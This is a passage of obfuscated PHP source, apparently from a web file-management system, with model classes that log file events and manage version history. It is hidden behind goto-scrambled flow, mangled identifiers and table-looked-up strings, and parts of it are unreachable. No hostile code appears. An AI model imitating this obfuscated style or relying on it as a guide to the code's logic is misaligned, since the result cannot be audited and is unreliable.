$cìÊùØÇÉ⁄[$e∏Õ®µÛ¢å]; } $cøß≠è‹Ã¡ = Model($a˜èäéÆ¡˜[520])->getInfo($e∏Õ®µÛ¢å); $cìÊùØÇÉ⁄[$e∏Õ®µÛ¢å] = array_to_keyvalue($cøß≠è‹Ã¡[$a˜èäéÆ¡˜[1885]], $a˜èäéÆ¡˜[1707]); return $cìÊùØÇÉ⁄[$e∏Õ®µÛ¢å]; } public function userGroupParents($f¡®íÂ÷ﬁ¥) { goto AÍ”Ú’◊èÃ; dΩ⁄öÎ÷ÂÇ: $eöÙªß≈æ = $GLOBALS[$eÂùÍ‡ıÃÇ[6]][$eÂùÍ‡ıÃÇ[88]][$eÂùÍ‡ıÃÇ[1804]] == 1; $A˜ÃµÆò‡Ç = $eöÙªß≈æ ? 3 : 2; foreach ($dÉ©¢ÿë´µ as $dı„Ú¯ˆÿ¢) { $C•€÷©è”‡ = array($dı„Ú¯ˆÿ¢[$eÂùÍ‡ıÃÇ[1707]]); $CÕŸë¥Öƒœ = explode($eÂùÍ‡ıÃÇ[47], trim($dı„Ú¯ˆÿ¢[$eÂùÍ‡ıÃÇ[503]], $eÂùÍ‡ıÃÇ[47])); if ($CÕŸë¥Öƒœ[0] == $eÂùÍ‡ıÃÇ[191] && count($CÕŸë¥Öƒœ) > $A˜ÃµÆò‡Ç) { $C°æ¥´Ãü≥ = array_slice($CÕŸë¥Öƒœ, $A˜ÃµÆò‡Ç); $C•€÷©è”‡ = array_merge($C•€÷©è”‡, array_reverse($C°æ¥´Ãü≥)); } $BŸ’πì ûû = array_merge($BŸ’πì ûû, $C•€÷©è”‡); } goto BùØ∏¬Üñ•; BùØ∏¬Üñ•: $fºµÏàãñã[$f¡®íÂ÷ﬁ¥] = array_unique($BŸ’πì ûû); return $fºµÏàãñã[$f¡®íÂ÷ﬁ¥]; goto dìüÖ•õÃ’; e€©ô∑⁄µå: if (isset($fºµÏàãñã[$f¡®íÂ÷ﬁ¥])) { return $fºµÏàãñã[$f¡®íÂ÷ﬁ¥]; } $dÉ©¢ÿë´µ = $this->userGroupList($f¡®íÂ÷ﬁ¥); $BŸ’πì ûû = array(); goto dΩ⁄öÎ÷ÂÇ; AÍ”Ú’◊èÃ: $eÂùÍ‡ıÃÇ =& $_SERVER[Öíæ€“”≠éÏË]; static $fºµÏàãñã = array(); $f¡®íÂ÷ﬁ¥ = $f¡®íÂ÷ﬁ¥ ? $f¡®íÂ÷ﬁ¥ : USER_ID; goto e€©ô∑⁄µå; dìüÖ•õÃ’: } public function authTargetInfoMake($b≈Ñ®˜ô¢⁄) { goto Cï“ÜÏ†·ç; FØßÛ™∆Ïí: return array($c∑Œ¬Ìæ≈ø[1915] => $B”√ïöªåç, $c∑Œ¬Ìæ≈ø[1916] => $e÷°¶¨Óˆå); goto AƒÇï¨Ω›Æ; Cï“ÜÏ†·ç: $c∑Œ¬Ìæ≈ø =& $_SERVER[Öíæ€“”≠éÏË]; $B”√ïöªåç = array(); $e÷°¶¨Óˆå = array(); goto aë´Î…⁄©∑; aë´Î…⁄©∑: foreach ($b≈Ñ®˜ô¢⁄ as $bëáÊÉ§à÷) { if ($bëáÊÉ§à÷[$c∑Œ¬Ìæ≈ø[405]] == SourceModel::TYPE_USER) { $B”√ïöªåç[] = intval($bëáÊÉ§à÷[$c∑Œ¬Ìæ≈ø[485]]); } else { if ($bëáÊÉ§à÷[$c∑Œ¬Ìæ≈ø[405]] == SourceModel::TYPE_GROUP) { $e÷°¶¨Óˆå[] = intval($bëáÊÉ§à÷[$c∑Œ¬Ìæ≈ø[485]]); } } } if ($B”√ïöªåç) { $B”√ïöªåç = Model($c∑Œ¬Ìæ≈ø[495])->userListInfo($B”√ïöªåç); } if ($e÷°¶¨Óˆå) { $Cñ‡™Ë©ππ = array($c∑Œ¬Ìæ≈ø[1791] => array($c∑Œ¬Ìæ≈ø[412], $e÷°¶¨Óˆå)); $e÷°¶¨Óˆå = Model($c∑Œ¬Ìæ≈ø[504])->field($c∑Œ¬Ìæ≈ø[1914])->where($Cñ‡™Ë©ππ)->select(); $e÷°¶¨Óˆå = array_to_keyvalue($e÷°¶¨Óˆå, $c∑Œ¬Ìæ≈ø[1707]); } goto FØßÛ™∆Ïí; AƒÇï¨Ω›Æ: } public function authInfo($bÊõ•≠©”º) { $aÒ‹–Ñﬂë =& $_SERVER[Öíæ€“”≠éÏË]; if ($bÊõ•≠©”º[$aÒ‹–Ñﬂë[1807]]) { $BùÑé°ñ•´ = Model($aÒ‹–Ñﬂë[489])->listData($bÊõ•≠©”º[$aÒ‹–Ñﬂë[1807]]); if (!$BùÑé°ñ•´) { return !1; $cêÇè≠ºÂ≠ = Model($aÒ‹–Ñﬂë[489])->listData(); $döÚÊƒê¥° = array_filter_by_field($cêÇè≠ºÂ≠, $aÒ‹–Ñﬂë[407], $aÒ‹–Ñﬂë[191]); return $döÚÊƒê¥°; } $c“î»õöÌß = array_field_key($BùÑé°ñ•´, array($aÒ‹–Ñﬂë[394], $aÒ‹–Ñﬂë[28], $aÒ‹–Ñﬂë[407], $aÒ‹–Ñﬂë[1729], $aÒ‹–Ñﬂë[1730])); $c“î»õöÌß[$aÒ‹–Ñﬂë[1917]] = $bÊõ•≠©”º; return $c“î»õöÌß; } else { return array($aÒ‹–Ñﬂë[413] => 0, $aÒ‹–Ñﬂë[1713] => $bÊõ•≠©”º[$aÒ‹–Ñﬂë[1861]], $aÒ‹–Ñﬂë[414] => $aÒ‹–Ñﬂë[33], $aÒ‹–Ñﬂë[1729] => $aÒ‹–Ñﬂë[1918]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\162\143\x65\x5f\x65\166\145\156\164"; protected $dataAuto = array(array("\143\162\145\x61\164\145\x54\x69\155\x65", "\164\x69\155\x65", "\x69\156\163\145\x72\164", "\x66\x75\x6e\143\164\151\x6f\x6e"), array("\144\x65\x73\x63", '', "\x69\x6e\163\145\162\x74\54\165\160\x64\x61\x74\x65\x2c\163\x65\x6c\145\143\164", "\x6a\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($cπêΩÇ£ú©, $E˜Áƒ·º∑ÿ, $F≥–¿¥ØÑò = '') { goto eÒçπÂå∆ ; b÷è≈ç•ï≠: return $this->add($E–≥ﬂ⁄∏©∞); goto e’êﬂúÊÍç; eÒçπÂå∆ : $cáÙ–‰ß±ß =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->eventSave) { return; } $AÚË»ñ‰¶Ã = Model($cáÙ–‰ß±ß[1215])->sourceInfo($cπêΩÇ£ú©); goto Aò°®ﬂ•©æ; Aò°®ﬂ•©æ: if (!$AÚË»ñ‰¶Ã) { return !1; } if ($this->isCacheEvent($AÚË»ñ‰¶Ã, $E˜Áƒ·º∑ÿ)) { return; } if ($F≥–¿¥ØÑò && is_string($F≥–¿¥ØÑò)) { $F≥–¿¥ØÑò = array($cáÙ–‰ß±ß[1745] => $F≥–¿¥ØÑò); } goto CÌ‚ÇéÜÁÇ; CÌ‚ÇéÜÁÇ: $E–≥ﬂ⁄∏©∞ = array($cáÙ–‰ß±ß[411] => $cπêΩÇ£ú©, $cáÙ–‰ß±ß[1919] => $AÚË»ñ‰¶Ã[$cáÙ–‰ß±ß[479]], $cáÙ–‰ß±ß[1920] => $AÚË»ñ‰¶Ã[$cáÙ–‰ß±ß[28]], $cáÙ–‰ß±ß[501] => !empty($AÚË»ñ‰¶Ã[$cáÙ–‰ß±ß[501]]) ? $AÚË»ñ‰¶Ã[$cáÙ–‰ß±ß[501]] : $cáÙ–‰ß±ß[33], $cáÙ–‰ß±ß[1529] => USER_ID, $cáÙ–‰ß±ß[416] => $E˜Áƒ·º∑ÿ, $cáÙ–‰ß±ß[1531] => $F≥–¿¥ØÑò); $this->addSystemLog($E˜Áƒ·º∑ÿ, $E–≥ﬂ⁄∏©∞); unset($E–≥ﬂ⁄∏©∞[$cáÙ–‰ß±ß[1920]], $E–≥ﬂ⁄∏©∞[$cáÙ–‰ß±ß[501]]); goto b÷è≈ç•ï≠; e’êﬂúÊÍç: } private function addSystemLog($B‡∆ææó◊ı, $b≈‰Ç–¢ÿ») { $e¬äµ¥™†» =& $_SERVER[Öíæ€“”≠éÏË]; if ($B‡∆ææó◊ı == $e¬äµ¥™†»[1921]) { $B‡∆ææó◊ı = $b≈‰Ç–¢ÿ»[$e¬äµ¥™†»[432]][$e¬äµ¥™†»[1922]]; } else { if (in_array($B‡∆ææó◊ı, array($e¬äµ¥™†»[1684], $e¬äµ¥™†»[1923]))) { $B‡∆ææó◊ı = $b≈‰Ç–¢ÿ»[$e¬äµ¥™†»[432]][$e¬äµ¥™†»[728]]; } } $Fº¿ÉΩΩ∆… = array_merge($b≈‰Ç–¢ÿ», array($e¬äµ¥™†»[1924] => $b≈‰Ç–¢ÿ»[$e¬äµ¥™†»[396]], $e¬äµ¥™†»[1925] => $b≈‰Ç–¢ÿ»[$e¬äµ¥™†»[1925]])); Model($e¬äµ¥™†»[1648])->addLog($e¬äµ¥™†»[1926] . $B‡∆ææó◊ı, $Fº¿ÉΩΩ∆…); } private function isCacheEvent($BÀ∫û§È„ù, $C¢∑Ó≥ƒú≥) { if ($BÀ∫û§È„ù[$_SERVER[Öíæ€“”≠éÏË][405]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($déõ≠œíóã, $bˆåÛ€¡≠¥) { $eºû—å˜å“ =& $_SERVER[Öíæ€“”≠éÏË]; $Cõ»ùÏÇè´ = Model($eºû—å˜å“[1215])->sourceInfo($déõ≠œíóã); $eû£¢°‰√Ï = array($eºû—å˜å“[1922] => $bˆåÛ€¡≠¥, $eºû—å˜å“[28] => $Cõ»ùÏÇè´[$eºû—å˜å“[28]]); return $this->addEvent($déõ≠œíóã, $eºû—å˜å“[1921], $eû£¢°‰√Ï); } public function eventFileEdit($DêÍßô‡‚ó) { $aô‡ﬂÑ—ì« =& $_SERVER[Öíæ€“”≠éÏË]; $Aô“úäü È = array($aô‡ﬂÑ—ì«[1927] => $_SERVER[$aô‡ﬂÑ—ì«[1928]], $aô‡ﬂÑ—ì«[1929] => strtolower(ACTION)); return $this->addEvent($DêÍßô‡‚ó, $aô‡ﬂÑ—ì«[1674], $Aô“úäü È); } public function eventRecycle($A—ﬁû∑◊≠•, $e÷ßèèÉâÊ) { return $this->addEvent($A—ﬁû∑◊≠•, $_SERVER[Öíæ€“”≠éÏË][1923], $e÷ßèèÉâÊ); } public function eventRemove($D∆´Î√°Ì…) { $dÒ•‚Éä∑π =& $_SERVER[Öíæ€“”≠éÏË]; $f›Îªó∏é  = Model($dÒ•‚Éä∑π[1215])->sourceInfo($D∆´Î√°Ì…); $Cù÷Î÷´«≤ = $f›Îªó∏é [$dÒ•‚Éä∑π[28]]; return $this->addEvent($f›Îªó∏é [$dÒ•‚Éä∑π[479]], $dÒ•‚Éä∑π[1673], $Cù÷Î÷´«≤); } public function eventShare($Aéªîæ û≠, $B¿ø“âﬂπÎ) { return $this->addEvent($Aéªîæ û≠, $_SERVER[Öíæ€“”≠éÏË][1684], $B¿ø“âﬂπÎ); } public function eventMove($d¯æº‘Ù‘Ç, $C æ®ËƒÚ¶, $Bﬁêíÿ·«™) { goto A∏»¡ö⁄ÆÖ; C”Õ≤âÕ÷º: $CØÕâÙ˘áﬁ = $EÎô´âßá°->sourceInfo($C æ®ËƒÚ¶); $b˘…äö¿•— = $EÎô´âßá°->sourceInfo($Bﬁêíÿ·«™); $càçáÚº≤î = array($DÓ±áôÖßÀ[1064] => $C æ®ËƒÚ¶, $DÓ±áôÖßÀ[1930] => $CØÕâÙ˘áﬁ[$DÓ±áôÖßÀ[28]], $DÓ±áôÖßÀ[1910] => !empty($CØÕâÙ˘áﬁ[$DÓ±áôÖßÀ[501]]) ? $CØÕâÙ˘áﬁ[$DÓ±áôÖßÀ[501]] : $DÓ±áôÖßÀ[33], $DÓ±áôÖßÀ[1065] => $Bﬁêíÿ·«™, $DÓ±áôÖßÀ[1931] => $b˘…äö¿•—[$DÓ±áôÖßÀ[28]], $DÓ±áôÖßÀ[1932] => !empty($b˘…äö¿•—[$DÓ±áôÖßÀ[501]]) ? $b˘…äö¿•—[$DÓ±áôÖßÀ[501]] : $DÓ±áôÖßÀ[33]); goto cãÎ◊»¿Íç; bˆ‚—Ò∏èá: $this->addEvent($C æ®ËƒÚ¶, $DÓ±áôÖßÀ[1933], $càçáÚº≤î); goto dﬁí¿¶Ú±Ñ; cãÎ◊»¿Íç: $this->addEvent($d¯æº‘Ù‘Ç, $DÓ±áôÖßÀ[534], $càçáÚº≤î); $A¢å·†âÖ™ = $EÎô´âßá°->sourceInfo($d¯æº‘Ù‘Ç); $càçáÚº≤î = array($DÓ±áôÖßÀ[396] => $A¢å·†âÖ™[$DÓ±áôÖßÀ[396]], $DÓ±áôÖßÀ[28] => $A¢å·†âÖ™[$DÓ±áôÖßÀ[28]]); goto bˆ‚—Ò∏èá; A∏»¡ö⁄ÆÖ: $DÓ±áôÖßÀ =& $_SERVER[Öíæ€“”≠éÏË]; $EÎô´âßá° = Model($DÓ±áôÖßÀ[1215]); $A¢å·†âÖ™ = $EÎô´âßá°->sourceInfo($d¯æº‘Ù‘Ç); goto C”Õ≤âÕ÷º; dﬁí¿¶Ú±Ñ: } public function eventCopy($b≈◊’©ßÃ”) { $this->eventCreate($b≈◊’©ßÃ”, $_SERVER[Öíæ€“”≠éÏË][532]); } public function eventRename($C…Çó®ô§¿, $D±á∞≤àıÒ, $dÔ–ÁôéæÁ) { $c∂ô«ô±ÿà =& $_SERVER[Öíæ€“”≠éÏË]; $f”â„Æà¡˜ = array($c∂ô«ô±ÿà[1064] => $D±á∞≤àıÒ, $c∂ô«ô±ÿà[1065] => $dÔ–ÁôéæÁ); return $this->addEvent($C…Çó®ô§¿, $c∂ô«ô±ÿà[1231], $f”â„Æà¡˜); } public function eventAddComment($eÉï®àœ’‚, $d¬∫æÿèÿ·) { return $this->addEvent($eÉï®àœ’‚, $_SERVER[Öíæ€“”≠éÏË][1934], $d¬∫æÿèÿ·); } public function eventAddDesc($aæ°Œ´à…–, $bòÕ·Üıå¬) { return $this->addEvent($aæ°Œ´à…–, $_SERVER[Öíæ€“”≠éÏË][1935], $bòÕ·Üıå¬); } public function listBySource($e›Ìø¿úﬂö) { goto d«éÕÇÑ∑¥; dÏÁÈ¢„Œ¡: return $this->eventListParse($FÍÜº˘îÏÜ, $e›Ìø¿úﬂö); goto Eó˘ﬂÿ∏™÷; d«éÕÇÑ∑¥: $CÛÂñÈàî• =& $_SERVER[Öíæ€“”≠éÏË]; $AïµÛ£“Ç– = Model($CÛÂñÈàî•[1215])->sourceInfo($e›Ìø¿úﬂö); $Cœ®¿±‰Ù„ = array($CÛÂñÈàî•[411] => $e›Ìø¿úﬂö); goto a¥”ß§ìÀè; a¥”ß§ìÀè: if ($AïµÛ£“Ç–[$CÛÂñÈàî•[404]] == $CÛÂñÈàî•[87]) { $cÔÉ¯›Ùª™ = Model($CÛÂñÈàî•[1215])->listSearchChildren($e›Ìø¿úﬂö, 20000); $cÔÉ¯›Ùª™[] = $e›Ìø¿úﬂö . $CÛÂñÈàî•[375]; $Cœ®¿±‰Ù„ = array($CÛÂñÈàî•[396] => array($CÛÂñÈàî•[7], $cÔÉ¯›Ùª™)); } $FÍÜº˘îÏÜ = $this->where($Cœ®¿±‰Ù„)->order($CÛÂñÈàî•[1936])->selectPage(); if ($FÍÜº˘îÏÜ[$CÛÂñÈàî•[364]][$CÛÂñÈàî•[365]] == 0) { $FÍÜº˘îÏÜ[$CÛÂñÈàî•[364]][$CÛÂñÈàî•[365]] = 1; $FÍÜº˘îÏÜ[$CÛÂñÈàî•[367]] = array(array($CÛÂñÈàî•[411] => $e›Ìø¿úﬂö, $CÛÂñÈàî•[1919] => $AïµÛ£“Ç–[$CÛÂñÈàî•[479]], $CÛÂñÈàî•[1529] => $AïµÛ£“Ç–[$CÛÂñÈàî•[433]], $CÛÂñÈàî•[416] => $CÛÂñÈàî•[1937], $CÛÂñÈàî•[417] => $AïµÛ£“Ç–[$CÛÂñÈàî•[194]], $CÛÂñÈàî•[1531] => $CÛÂñÈàî•[33])); } goto dÏÁÈ¢„Œ¡; Eó˘ﬂÿ∏™÷: } private function eventListParse($F€ÖÒÌÊÛ•, $aÔÇœπ≠≤÷) { goto C· Œ∫âÙ¨; c√îÚ§Â⁄è: $A±‚¯È‡É• = array_unique($A±‚¯È‡É•); $BÉ ´±À• = array_unique(array_to_keyvalue($dÃµáÑóπª, $d¿πâ√íá´[33], $d¿πâ√íá´[1538])); $d¢±éÉèéä = Model($d¿πâ√íá´[520])->userListInfo($BÉ ´±À•); goto CÁÔÈØ⁄Ω™; CÁÔÈØ⁄Ω™: $a§ÑÛ±Øéﬂ = Model($d¿πâ√íá´[803])->sourceListInfo($A±‚¯È‡É•, !0); foreach ($dÃµáÑóπª as &$AΩ›ÔèãµÔ) { if ($AΩ›ÔèãµÔ[$d¿πâ√íá´[29]] == $d¿πâ√íá´[534] && isset($AΩ›ÔèãµÔ[$d¿πâ√íá´[432]][$d¿πâ√íá´[1064]])) { $AΩ›ÔèãµÔ[$d¿πâ√íá´[432]][$d¿πâ√íá´[1064]] = $a§ÑÛ±Øéﬂ[$AΩ›ÔèãµÔ[$d¿πâ√íá´[432]][$d¿πâ√íá´[1064]]]; $AΩ›ÔèãµÔ[$d¿πâ√íá´[432]][$d¿πâ√íá´[1065]] = $a§ÑÛ±Øéﬂ[$AΩ›ÔèãµÔ[$d¿πâ√íá´[432]][$d¿πâ√íá´[1065]]]; } if ($AΩ›ÔèãµÔ[$d¿πâ√íá´[29]] == $d¿πâ√íá´[1933] && isset($AΩ›ÔèãµÔ[$d¿πâ√íá´[432]][$d¿πâ√íá´[396]])) { $AΩ›ÔèãµÔ[$d¿πâ√íá´[432]][$d¿πâ√íá´[396]] = $a§ÑÛ±Øéﬂ[$AΩ›ÔèãµÔ[$d¿πâ√íá´[432]][$d¿πâ√íá´[396]]]; } $AΩ›ÔèãµÔ[$d¿πâ√íá´[85]] = $a§ÑÛ±Øéﬂ[$AΩ›ÔèãµÔ[$d¿πâ√íá´[396]]]; $AΩ›ÔèãµÔ[$d¿πâ√íá´[1938]] = $a§ÑÛ±Øéﬂ[$AΩ›ÔèãµÔ[$d¿πâ√íá´[1925]]]; if ($AΩ›ÔèãµÔ[$d¿πâ√íá´[29]] == $d¿πâ√íá´[1673]) { $AΩ›ÔèãµÔ[$d¿πâ√íá´[1938]] = $AΩ›ÔèãµÔ[$d¿πâ√íá´[85]]; $AΩ›ÔèãµÔ[$d¿πâ√íá´[1925]] = $AΩ›ÔèãµÔ[$d¿πâ√íá´[1938]][$d¿πâ√íá´[396]]; $AΩ›ÔèãµÔ[$d¿πâ√íá´[85]] = !1; $AΩ›ÔèãµÔ[$d¿πâ√íá´[396]] = $d¿πâ√íá´[33]; } $AΩ›ÔèãµÔ[$d¿πâ√íá´[1869]] = $d¢±éÉèéä[$AΩ›ÔèãµÔ[$d¿πâ√íá´[1538]]]; } unset($AΩ›ÔèãµÔ); goto eÇ± ê⁄Àì; C· Œ∫âÙ¨: $d¿πâ√íá´ =& $_SERVER[Öíæ€“”≠éÏË]; $dÃµáÑóπª = $F€ÖÒÌÊÛ•[$d¿πâ√íá´[367]]; $A±‚¯È‡É• = array_to_keyvalue($dÃµáÑóπª, $d¿πâ√íá´[33], $d¿πâ√íá´[396]); goto B„´Ë∂¨‹Ù; eÇ± ê⁄Àì: $F€ÖÒÌÊÛ•[$d¿πâ√íá´[367]] = $dÃµáÑóπª; return $F€ÖÒÌÊÛ•; goto D»§ÑÏµÆê; B„´Ë∂¨‹Ù: $cÎ®Ôë¡ºÇ = array_to_keyvalue($dÃµáÑóπª, $d¿πâ√íá´[33], $d¿πâ√íá´[1925]); foreach ($dÃµáÑóπª as $AΩ›ÔèãµÔ) { $c«µ≠Ú—„µ = $AΩ›ÔèãµÔ[$d¿πâ√íá´[432]]; if ($AΩ›ÔèãµÔ[$d¿πâ√íá´[29]] == $d¿πâ√íá´[534] && isset($c«µ≠Ú—„µ[$d¿πâ√íá´[1064]])) { $A±‚¯È‡É•[] = $c«µ≠Ú—„µ[$d¿πâ√íá´[1064]] . $d¿πâ√íá´[33]; $A±‚¯È‡É•[] = $c«µ≠Ú—„µ[$d¿πâ√íá´[1065]] . $d¿πâ√íá´[33]; } if ($AΩ›ÔèãµÔ[$d¿πâ√íá´[29]] == $d¿πâ√íá´[1933] && isset($c«µ≠Ú—„µ[$d¿πâ√íá´[396]])) { $A±‚¯È‡É•[] = $c«µ≠Ú—„µ[$d¿πâ√íá´[396]] . $d¿πâ√íá´[33]; } } $A±‚¯È‡É• = array_merge($A±‚¯È‡É•, $cÎ®Ôë¡ºÇ, array($aÔÇœπ≠≤÷ . $d¿πâ√íá´[33])); goto c√îÚ§Â⁄è; D»§ÑÏµÆê: } public function removeBySource($dπ›Áã÷‰) { $E–¶–ª»¡¿ = array($_SERVER[Öíæ€“”≠éÏË][411] => $dπ›Áã÷‰); $this->where($E–¶–ª»¡¿)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\162\143\145\137\150\151\x73\164\x6f\x72\171"; public function historyCount($eΩÜÿßÕÇ∏) { goto eƒÜôŸ—ºÂ; B£›ñâ‘ßé: return array_to_keyvalue($BÁêËèÁó¯, $aÑäÇÇÎêÂ[396], $aÑäÇÇÎêÂ[481]); goto e„¡¿èèÁ◊; eƒÜôŸ—ºÂ: $aÑäÇÇÎêÂ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$eΩÜÿßÕÇ∏) { return array(); } if (is_string($eΩÜÿßÕÇ∏) || is_int($eΩÜÿßÕÇ∏)) { $eΩÜÿßÕÇ∏ = array($eΩÜÿßÕÇ∏); } goto eŒ√‚ÜÚç√; eŒ√‚ÜÚç√: $eòÛ¨Á‚∂« = array($aÑäÇÇÎêÂ[396], $aÑäÇÇÎêÂ[1739] => $aÑäÇÇÎêÂ[481]); $F◊é„åû·ﬁ = array($aÑäÇÇÎêÂ[396] => array($aÑäÇÇÎêÂ[7], $eΩÜÿßÕÇ∏)); $BÁêËèÁó¯ = $this->field($eòÛ¨Á‚∂«)->where($F◊é„åû·ﬁ)->group($aÑäÇÇÎêÂ[396])->select(); goto B£›ñâ‘ßé; e„¡¿èèÁ◊: } public function addHistory($A´ëè‡Öï”, $bØ›œ‹‰ã∆ = '') { $eà⁄æ–ı’„ =& $_SERVER[Öíæ€“”≠éÏË]; $fˆ©û—â∆’ = array($eà⁄æ–ı’„[411] => $A´ëè‡Öï”[$eà⁄æ–ı’„[396]], $eà⁄æ–ı’„[1529] => isset($A´ëè‡Öï”[$eà⁄æ–ı’„[435]]) ? $A´ëè‡Öï”[$eà⁄æ–ı’„[435]] : $A´ëè‡Öï”[$eà⁄æ–ı’„[433]], $eà⁄æ–ı’„[449] => $A´ëè‡Öï”[$eà⁄æ–ı’„[448]], $eà⁄æ–ı’„[562] => $A´ëè‡Öï”[$eà⁄æ–ı’„[78]], $eà⁄æ–ı’„[1939] => $bØ›œ‹‰ã∆); $E´„„ƒö…‘ = $GLOBALS[$eà⁄æ–ı’„[6]][$eà⁄æ–ı’„[88]][$eà⁄æ–ı’„[1113]]; if ($E´„„ƒö…‘ > 1) { $this->historyAutoClear($fˆ©û—â∆’[$eà⁄æ–ı’„[396]]); $this->add($fˆ©û—â∆’); } Hook::trigger($eà⁄æ–ı’„[1940], $fˆ©û—â∆’); Model($eà⁄æ–ı’„[1941])->eventFileEdit($A´ëè‡Öï”[$eà⁄æ–ı’„[396]]); } private function historyAutoClear($e∂óº©ÑÊ·) { goto e¬…√ıØ¶; e¬…√ıØ¶: $A–ò’¥â’˜ =& $_SERVER[Öíæ€“”≠éÏË]; $A…∫ÕççïŒ = Model($A–ò’¥â’˜[743])->get($A–ò’¥â’˜[1135]); $aÜâáçÕ£´ = $GLOBALS[$A–ò’¥â’˜[6]][$A–ò’¥â’˜[88]][$A–ò’¥â’˜[1113]]; goto C√ÇæÆÔÚÆ; cäóå±Ã÷ß: $AªÓ◊‘˜∞ = array_to_keyvalue($Eõåç≠˘Â÷, $A–ò’¥â’˜[33], $A–ò’¥â’˜[394]); $AªÓ◊‘˜∞ = array_slice($AªÓ◊‘˜∞, $EßÛπ˘∆çÇ); $a›î„≈◊ŒØ = array_to_keyvalue($Eõåç≠˘Â÷, $A–ò’¥â’˜[33], $A–ò’¥â’˜[448]); goto CÇçˆà∫Íö; B¡ñéÛåèœ: $this->where($c≥´ïàäÖ∫)->delete(); Model($A–ò’¥â’˜[451])->remove($a›î„≈◊ŒØ); goto CñûÍËì‘◊; CÇçˆà∫Íö: $a›î„≈◊ŒØ = array_slice($a›î„≈◊ŒØ, $EßÛπ˘∆çÇ); if (!$AªÓ◊‘˜∞ || !$a›î„≈◊ŒØ) { return; } $c≥´ïàäÖ∫ = array($A–ò’¥â’˜[413] => array($A–ò’¥â’˜[7], $AªÓ◊‘˜∞)); goto B¡ñéÛåèœ; C√ÇæÆÔÚÆ: $EßÛπ˘∆çÇ = $A…∫ÕççïŒ == $A–ò’¥â’˜[1136] ? 5 : $aÜâáçÕ£´; if ($aÜâáçÕ£´ <= 1) { $EßÛπ˘∆çÇ = 1; } if ($EßÛπ˘∆çÇ >= 500) { return; } goto dıÔ¥≈™˜Ÿ; dıÔ¥≈™˜Ÿ: $c≥´ïàäÖ∫ = array($A–ò’¥â’˜[411] => $e∂óº©ÑÊ·); $Eõåç≠˘Â÷ = $this->field($A–ò’¥â’˜[1942])->where($c≥´ïàäÖ∫)->order($A–ò’¥â’˜[1936])->select(); if (!$Eõåç≠˘Â÷ || $EßÛπ˘∆çÇ >= count($Eõåç≠˘Â÷)) { return; } goto cäóå±Ã÷ß; CñûÍËì‘◊: } public function listData($Câïé§∏·ˆ) { goto dÿÇƒù≈¢ì; D∑ﬁ‰È¯ÒÏ: $AÉ‰ûòÖâŒ = 5; if ($C≤¡â‰øﬁı == $bì÷ŒúÕçÔ[1136]) { $EÕ«¡äÿˆ‹[$bì÷ŒúÕçÔ[367]] = array_slice($EÕ«¡äÿˆ‹[$bì÷ŒúÕçÔ[367]], 0, $AÉ‰ûòÖâŒ); $EÕ«¡äÿˆ‹[$bì÷ŒúÕçÔ[364]] = array($bì÷ŒúÕçÔ[1944] => 1, $bì÷ŒúÕçÔ[1945] => 20, $bì÷ŒúÕçÔ[1946] => 1, $bì÷ŒúÕçÔ[1947] => count($EÕ«¡äÿˆ‹[$bì÷ŒúÕçÔ[367]])); } return $EÕ«¡äÿˆ‹; goto c©Æ‹∞∆áÍ; CªüÍÛú¶§: $EÕ«¡äÿˆ‹ = $this->field($D∫ãÙáà∫ç)->where($BÍΩœ´‚µø)->order($bì÷ŒúÕçÔ[1936])->selectPage(); $this->_listAppendUser($EÕ«¡äÿˆ‹[$bì÷ŒúÕçÔ[367]]); $C≤¡â‰øﬁı = Model($bì÷ŒúÕçÔ[743])->get($bì÷ŒúÕçÔ[1135]); goto D∑ﬁ‰È¯ÒÏ; dÿÇƒù≈¢ì: $bì÷ŒúÕçÔ =& $_SERVER[Öíæ€“”≠éÏË]; $BÍΩœ´‚µø = array($bì÷ŒúÕçÔ[411] => $Câïé§∏·ˆ); $D∫ãÙáà∫ç = $bì÷ŒúÕçÔ[1943]; goto CªüÍÛú¶§; c©Æ‹∞∆áÍ: } protected function _listAppendUser(&$A¬‰´™åÑ™) { $eÜÕºÁıÖ„ =& $_SERVER[Öíæ€“”≠éÏË]; $dïÖ÷Û≤√Ê = array_to_keyvalue($A¬‰´™åÑ™, $eÜÕºÁıÖ„[33], $eÜÕºÁıÖ„[1538]); $bÉÃ≥∂–π = Model($eÜÕºÁıÖ„[520])->userListInfo($dïÖ÷Û≤√Ê); foreach ($A¬‰´™åÑ™ as &$EÃÕˆ¨∫∑√) { $FÒû§´É≠∫ = $EÃÕˆ¨∫∑√[$eÜÕºÁıÖ„[1538]]; $EÃÕˆ¨∫∑√[$eÜÕºÁıÖ„[433]] = $bÉÃ≥∂–π[$FÒû§´É≠∫] ? $bÉÃ≥∂–π[$FÒû§´É≠∫] : !1; } unset($EÃÕˆ¨∫∑√); } public function fileInfo($BéËøá∑’È) { $fìô«Ñã∏¯ =& $_SERVER[Öíæ€“”≠éÏË]; $e…È∂ÆúÉ£ = $this->tablePrefix; $c”Ô≤èÒ±Û = "{$e…È∂ÆúÉ£}\x69\157\x5f\146\x69\154\145\40\146\151\154\145\163\x20\x6f\156\x20\x66\x69\154\145\x73\x2e\146\x69\154\145\111\104\40\x3d\40\150\151\x73\164\157\x72\x79\x2e\x66\x69\154\145\x49\x44"; return $this->alias($fìô«Ñã∏¯[1948])->where(array($fìô«Ñã∏¯[413] => $BéËøá∑’È))->join($c”Ô≤èÒ±Û, $fìô«Ñã∏¯[1949])->find(); } public function removeItem($Dç¬˜É´–œ) { $Cµ…∂ö”Ü… =& $_SERVER[Öíæ€“”≠éÏË]; $c†î∂â§ÆŸ = array($Cµ…∂ö”Ü…[413] => $Dç¬˜É´–œ); $aúÊﬁ•ü´∑ = $this->where($c†î∂â§ÆŸ)->find(); if ($aúÊﬁ•ü´∑) { $CÜïä¡Æ∑Ì = $this->where($c†î∂â§ÆŸ)->delete(); Model($Cµ…∂ö”Ü…[451])->remove($aúÊﬁ•ü´∑[$Cµ…∂ö”Ü…[448]]); return $CÜïä¡Æ∑Ì; } return !1; } public function removeBySource($Dè∂ÓœØ’Ç) { goto c¢‹ä·ÑΩ∂; c¢‹ä·ÑΩ∂: $A¢¿À…ä£ç =& 